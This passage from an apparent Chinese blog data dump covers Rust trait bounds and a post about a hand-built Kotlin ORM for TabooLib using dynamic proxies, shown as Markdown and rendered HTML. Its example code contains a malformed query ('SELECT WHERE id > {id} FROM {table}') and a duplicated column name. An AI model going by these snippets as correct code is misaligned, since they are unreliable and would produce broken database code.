class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 使用where约束</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">i32</span>\n    <span class=\"token keyword\">where</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span>\n          <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>虽然 <code>impl Trait</code> 这种语法非常好理解，但是实际上它只是一个语法糖：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Summary</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! &#123;&#125;\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>&#x2F;&#x2F; TODO</p>\n"},{"title":"写了个Kotlin ORM框架","date":"2022-01-11T16:00:00.000Z","author":"寒雨","hide":false,"summary":"用动态代理实现了一套基于TabooLib的Kotlin ORM框架","_content":"\n# 写了个Kotlin ORM框架\n\n嘛，一直想写框架，又发现TabooLib的数据库虽然有跟ktorm比起来也不差的sql-dsl支持，但却缺少ORM的支持。\n\n虽说直接用ktorm也不是不行，但这可是个绝佳的练手项目。我早八百年前就想写框架了。\n\n## 设计\n\n一个框架也许最重要的就是它的设计，这将决定开发者用得爽不爽。事实证明，好用才是第一位，哪怕效率都得靠边站。\n\n**开发效率第一**\n\n于是为了设计好这个框架，我那天从凌晨1点构思到3点半，最终确定了一套个人觉得非常不错的设计\n\n最开始借鉴了很多Android Jetpack Room的设计，然后结合实际情况改了不少，还顺带给TabooLib的DSL做了支持\n\n如今感觉这套设计青出于蓝，甚至比Room更胜一筹 （个人感觉）\n\n```kotlin\ndata class ExampleEntity(\n    // PrimaryKey 不用写option\n    @PrimaryKey(autoGenerate = true)\n    @Column(name = \"id\", type = ColumnTypeSQL.INT)\n    val id: Int? = null,\n    @Column(name = \"type\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val type: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val user: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, def = \"null\")\n    val data: String?\n)\n\ninterface ExampleDAO : IDao<ExampleEntity> {\n    @Query(\"SELECT * FROM {table}\")\n    fun queryAll(): List<ExampleEntity>\n\n    @Insert\n    fun insert(entity: ExampleEntity)\n    \n    @Query(\"DELETE FROM {table}\")\n    fun delete()\n    \n    @Query(\"SELECT WHERE id > {id} FROM {table}\")\n    fun querySome(id: Int): List<ExampleEntity>\n    \n    // 使用TabooLib DSL语句控制\n    @DSL\n    fun selectUser(name: String): ExampleEntity? {\n        return table.workspace(datasource) {\n            select { where { \"user\" eq name } }\n        }.firstOrNull {\n            adaptResultSet()\n        }\n    }\n}\n\nobject AppDatabase {\n    /**\n     * 也可通过ORMBuilder#buildFromConf(ConfigurationSection, String)直接构建\n     */\n    private val builder by lazy {\n        ORMBuilder.newBuilder()\n            .host(\"localhost\")\n            .port(3306)\n            .user(\"root\")\n            .password(\"root\")\n            .database(\"database\")\n            .buildHost()\n    } \n    \n    \n    val exampleTableDao by lazy {\n        // 表名 DAO类\n        builder.build(\"exampleTable\" ,ExampleDAO::class.java)\n    }\n}\n```\n\n## 实现\n\n### 平台\n\n最开始其实我是想做成跨平台项目的，然后提供TabooLib的实现。\n\n然后我发现说实话我对跨平台设计还不是特别了解，于是最后一气之下换成了TabooLib单平台实现。\n\n### 动态代理\n\n最开始其实我是完全没有头绪的，后面看了一下Room的使用方法，麻木的仿写出了一套写法\n\n后来再看了一遍这个写法，联想到了Retrofit，然后想到了Retrofit的底层实现是动态代理\n\n说实话以前没有用过动态代理，于是就去了解了一下子\n\n最后发现这个项目的灵魂就在动态代理，而且其实代码量并不多\n\n### 坑\n\n- Kotlin接口方法默认实现不是基于JDK8以后的default关键字，而是在接口里生成了一个静态内部类以静态方法的形式存放\n- ResultSet应该以迭代器的方式使用\n- 获取父类/接口的泛型应该使用genericSuperClass/Interfaces\n- 返回值类型为void或Unit的方法的returnType不是Void::class.java,也不是Unit::class.java。但它可以用returnType.name == \"void\"这种形式进行判断","source":"_posts/taboolib-orm.md","raw":"---\ntitle: 写了个Kotlin ORM框架\ndate: 2022-01-12\nauthor: 寒雨\nhide: false\nsummary: 用动态代理实现了一套基于TabooLib的Kotlin ORM框架\ncategories: 杂谈\ntags:\n  - Kotlin\t\n  - TabooLib\n  - MySQL\n  - 动态代理\n---\n\n# 写了个Kotlin ORM框架\n\n嘛，一直想写框架，又发现TabooLib的数据库虽然有跟ktorm比起来也不差的sql-dsl支持，但却缺少ORM的支持。\n\n虽说直接用ktorm也不是不行，但这可是个绝佳的练手项目。我早八百年前就想写框架了。\n\n## 设计\n\n一个框架也许最重要的就是它的设计，这将决定开发者用得爽不爽。事实证明，好用才是第一位，哪怕效率都得靠边站。\n\n**开发效率第一**\n\n于是为了设计好这个框架，我那天从凌晨1点构思到3点半，最终确定了一套个人觉得非常不错的设计\n\n最开始借鉴了很多Android Jetpack Room的设计，然后结合实际情况改了不少，还顺带给TabooLib的DSL做了支持\n\n如今感觉这套设计青出于蓝，甚至比Room更胜一筹 （个人感觉）\n\n```kotlin\ndata class ExampleEntity(\n    // PrimaryKey 不用写option\n    @PrimaryKey(autoGenerate = true)\n    @Column(name = \"id\", type = ColumnTypeSQL.INT)\n    val id: Int? = null,\n    @Column(name = \"type\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val type: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, options = [ColumnOptionSQL.NOTNULL])\n    val user: String,\n    @Column(name = \"user\", type = ColumnTypeSQL.TEXT, def = \"null\")\n    val data: String?\n)\n\ninterface ExampleDAO : IDao<ExampleEntity> {\n    @Query(\"SELECT * FROM {table}\")\n    fun queryAll(): List<ExampleEntity>\n\n    @Insert\n    fun insert(entity: ExampleEntity)\n    \n    @Query(\"DELETE FROM {table}\")\n    fun delete()\n    \n    @Query(\"SELECT WHERE id > {id} FROM {table}\")\n    fun querySome(id: Int): List<ExampleEntity>\n    \n    // 使用TabooLib DSL语句控制\n    @DSL\n    fun selectUser(name: String): ExampleEntity? {\n        return table.workspace(datasource) {\n            select { where { \"user\" eq name } }\n        }.firstOrNull {\n            adaptResultSet()\n        }\n    }\n}\n\nobject AppDatabase {\n    /**\n     * 也可通过ORMBuilder#buildFromConf(ConfigurationSection, String)直接构建\n     */\n    private val builder by lazy {\n        ORMBuilder.newBuilder()\n            .host(\"localhost\")\n            .port(3306)\n            .user(\"root\")\n            .password(\"root\")\n            .database(\"database\")\n            .buildHost()\n    } \n    \n    \n    val exampleTableDao by lazy {\n        // 表名 DAO类\n        builder.build(\"exampleTable\" ,ExampleDAO::class.java)\n    }\n}\n```\n\n## 实现\n\n### 平台\n\n最开始其实我是想做成跨平台项目的，然后提供TabooLib的实现。\n\n然后我发现说实话我对跨平台设计还不是特别了解，于是最后一气之下换成了TabooLib单平台实现。\n\n### 动态代理\n\n最开始其实我是完全没有头绪的，后面看了一下Room的使用方法，麻木的仿写出了一套写法\n\n后来再看了一遍这个写法，联想到了Retrofit，然后想到了Retrofit的底层实现是动态代理\n\n说实话以前没有用过动态代理，于是就去了解了一下子\n\n最后发现这个项目的灵魂就在动态代理，而且其实代码量并不多\n\n### 坑\n\n- Kotlin接口方法默认实现不是基于JDK8以后的default关键字，而是在接口里生成了一个静态内部类以静态方法的形式存放\n- ResultSet应该以迭代器的方式使用\n- 获取父类/接口的泛型应该使用genericSuperClass/Interfaces\n- 返回值类型为void或Unit的方法的returnType不是Void::class.java,也不是Unit::class.java。但它可以用returnType.name == \"void\"这种形式进行判断","slug":"taboolib-orm","published":1,"updated":"2022-11-24T02:42:00.010Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtv002hsfkl3gfsb68t","content":"<h1 id=\"写了个Kotlin-ORM框架\"><a href=\"#写了个Kotlin-ORM框架\" class=\"headerlink\" title=\"写了个Kotlin ORM框架\"></a>写了个Kotlin ORM框架</h1><p>嘛，一直想写框架，又发现TabooLib的数据库虽然有跟ktorm比起来也不差的sql-dsl支持，但却缺少ORM的支持。</p>\n<p>虽说直接用ktorm也不是不行，但这可是个绝佳的练手项目。我早八百年前就想写框架了。</p>\n<h2 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h2><p>一个框架也许最重要的就是它的设计，这将决定开发者用得爽不爽。事实证明，好用才是第一位，哪怕效率都得靠边站。</p>\n<p><strong>开发效率第一</strong></p>\n<p>于是为了设计好这个框架，我那天从凌晨1点构思到3点半，最终确定了一套个人觉得非常不错的设计</p>\n<p>最开始借鉴了很多Android Jetpack Room的设计，然后结合实际情况改了不少，还顺带给TabooLib的DSL做了支持</p>\n<p>如今感觉这套设计青出于蓝，甚至比Room更胜一筹 （个人感觉）</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ExampleEntity</span><span class=\"token punctuation\">(</span>\n    <span class=\"token comment\">// PrimaryKey 不用写option</span>\n    <span class=\"token annotation builtin\">@PrimaryKey</span><span class=\"token punctuation\">(</span>autoGenerate <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>INT<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> id<span class=\"token operator\">:</span> Int<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> user<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> def <span class=\"token operator\">=</span> <span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> ExampleDAO <span class=\"token operator\">:</span> IDao<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT * FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">queryAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token annotation builtin\">@Insert</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>entity<span class=\"token operator\">:</span> ExampleEntity<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DELETE FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT WHERE id &gt; {id} FROM {table}\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">querySome</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">&gt;</span>\n    \n    <span class=\"token comment\">// 使用TabooLib DSL语句控制</span>\n    <span class=\"token annotation builtin\">@DSL</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">selectUser</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ExampleEntity<span class=\"token operator\">?</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> table<span class=\"token punctuation\">.</span><span class=\"token function\">workspace</span><span class=\"token punctuation\">(</span>datasource<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            select <span class=\"token punctuation\">{</span> <span class=\"token keyword\">where</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"user\"</span> eq name <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span><span class=\"token function\">firstOrNull</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">adaptResultSet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">object</span> AppDatabase <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/**\n     * 也可通过ORMBuilder#buildFromConf(ConfigurationSection, String)直接构建\n     */</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> builder <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n        ORMBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">newBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">host</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">port</span><span class=\"token punctuation\">(</span><span class=\"token number\">3306</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">password</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"database\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">buildHost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> \n    \n    \n    <span class=\"token keyword\">val</span> exampleTableDao <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 表名 DAO类</span>\n        builder<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exampleTable\"</span> <span class=\"token punctuation\">,</span>ExampleDAO<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><h3 id=\"平台\"><a href=\"#平台\" class=\"headerlink\" title=\"平台\"></a>平台</h3><p>最开始其实我是想做成跨平台项目的，然后提供TabooLib的实现。</p>\n<p>然后我发现说实话我对跨平台设计还不是特别了解，于是最后一气之下换成了TabooLib单平台实现。</p>\n<h3 id=\"动态代理\"><a href=\"#动态代理\" class=\"headerlink\" title=\"动态代理\"></a>动态代理</h3><p>最开始其实我是完全没有头绪的，后面看了一下Room的使用方法，麻木的仿写出了一套写法</p>\n<p>后来再看了一遍这个写法，联想到了Retrofit，然后想到了Retrofit的底层实现是动态代理</p>\n<p>说实话以前没有用过动态代理，于是就去了解了一下子</p>\n<p>最后发现这个项目的灵魂就在动态代理，而且其实代码量并不多</p>\n<h3 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h3><ul>\n<li>Kotlin接口方法默认实现不是基于JDK8以后的default关键字，而是在接口里生成了一个静态内部类以静态方法的形式存放</li>\n<li>ResultSet应该以迭代器的方式使用</li>\n<li>获取父类/接口的泛型应该使用genericSuperClass/Interfaces</li>\n<li>返回值类型为void或Unit的方法的returnType不是Void::class.java,也不是Unit::class.java。但它可以用returnType.name == “void”这种形式进行判断</li>\n</ul>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"写了个Kotlin-ORM框架\"><a href=\"#写了个Kotlin-ORM框架\" class=\"headerlink\" title=\"写了个Kotlin ORM框架\"></a>写了个Kotlin ORM框架</h1><p>嘛，一直想写框架，又发现TabooLib的数据库虽然有跟ktorm比起来也不差的sql-dsl支持，但却缺少ORM的支持。</p>\n<p>虽说直接用ktorm也不是不行，但这可是个绝佳的练手项目。我早八百年前就想写框架了。</p>\n<h2 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h2><p>一个框架也许最重要的就是它的设计，这将决定开发者用得爽不爽。事实证明，好用才是第一位，哪怕效率都得靠边站。</p>\n<p><strong>开发效率第一</strong></p>\n<p>于是为了设计好这个框架，我那天从凌晨1点构思到3点半，最终确定了一套个人觉得非常不错的设计</p>\n<p>最开始借鉴了很多Android Jetpack Room的设计，然后结合实际情况改了不少，还顺带给TabooLib的DSL做了支持</p>\n<p>如今感觉这套设计青出于蓝，甚至比Room更胜一筹 （个人感觉）</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ExampleEntity</span><span class=\"token punctuation\">(</span>\n    <span class=\"token comment\">// PrimaryKey 不用写option</span>\n    <span class=\"token annotation builtin\">@PrimaryKey</span><span class=\"token punctuation\">(</span>autoGenerate <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>INT<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> id<span class=\"token operator\">:</span> Int<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ColumnOptionSQL<span class=\"token punctuation\">.</span>NOTNULL<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> user<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token annotation builtin\">@Column</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> type <span class=\"token operator\">=</span> ColumnTypeSQL<span class=\"token punctuation\">.</span>TEXT<span class=\"token punctuation\">,</span> def <span class=\"token operator\">=</span> <span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> ExampleDAO <span class=\"token operator\">:</span> IDao<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT * FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">queryAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span>\n\n    <span class=\"token annotation builtin\">@Insert</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>entity<span class=\"token operator\">:</span> ExampleEntity<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DELETE FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token annotation builtin\">@Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT WHERE id > &#123;id&#125; FROM &#123;table&#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">querySome</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>ExampleEntity<span class=\"token operator\">></span>\n    \n    <span class=\"token comment\">// 使用TabooLib DSL语句控制</span>\n    <span class=\"token annotation builtin\">@DSL</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">selectUser</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ExampleEntity<span class=\"token operator\">?</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> table<span class=\"token punctuation\">.</span><span class=\"token function\">workspace</span><span class=\"token punctuation\">(</span>datasource<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            select <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">where</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"user\"</span> eq name <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">firstOrNull</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">adaptResultSet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">object</span> AppDatabase <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * 也可通过ORMBuilder#buildFromConf(ConfigurationSection, String)直接构建\n     */</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> builder <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n        ORMBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">newBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">host</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">port</span><span class=\"token punctuation\">(</span><span class=\"token number\">3306</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">password</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"database\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">buildHost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> \n    \n    \n    <span class=\"token keyword\">val</span> exampleTableDao <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 表名 DAO类</span>\n        builder<span class=\"token punctuation\">.</span><span 